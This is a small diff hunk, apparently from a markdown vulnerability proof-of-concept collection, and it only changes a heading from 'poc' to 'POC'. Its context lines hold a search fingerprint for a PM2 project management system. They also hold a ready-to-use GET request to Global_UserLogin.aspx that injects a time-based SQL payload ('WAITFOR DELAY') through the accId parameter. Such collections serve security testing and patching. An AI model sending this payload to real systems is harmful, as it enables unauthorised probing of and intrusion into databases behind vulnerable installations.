@@ -8,7 +8,7 @@
 body="PM2项目管理系统BS版增强工具.zip"
 ```
 
-## poc
+## POC
 
 ```
 GET /Global/Global_UserLogin.aspx?accId=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&loginCode=&password=&type= HTTP/1.1
